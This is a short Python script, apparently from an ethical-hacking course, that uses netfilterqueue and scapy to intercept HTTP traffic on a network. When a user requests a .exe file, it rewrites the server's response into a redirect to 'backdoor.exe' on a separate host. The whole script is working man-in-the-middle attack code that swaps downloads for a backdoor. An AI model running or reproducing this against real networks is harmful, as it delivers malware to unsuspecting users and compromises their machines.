#!/usr/bin/env python3


import netfilterqueue
import scapy.all as scapy

# list containing all the ack values from the tcp packets
ack_list = []


def setLoad(packet, loadvalue):
    # set the load part of the packet to the custom one
    packet[scapy.Raw] = scapy.Raw(load=loadvalue)
    # delete the values of the redundant fields so they are recalculated automatically
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if (scapy_packet.haslayer(scapy.Raw)):
        # destination port 80 - Going to HTTP server - Request
        if (scapy_packet[scapy.TCP].dport == 80):
            if (".exe" in str(scapy_packet[scapy.Raw].load)):
                print("[+] .exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        # source port 80 - Returning from HTTP server - Response
        elif (scapy_packet[scapy.TCP].sport == 80):
            # if a seq value exists in the ack values list then this response is a response to a requested .exe file
            if (scapy_packet[scapy.TCP].seq in ack_list):
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = setLoad(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.3.4/backdoor.exe\n\n")
                # change the original packet
                packet.set_payload(bytes(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
#bind the Queue with the queue
queue.bind(0, process_packet)
queue.run()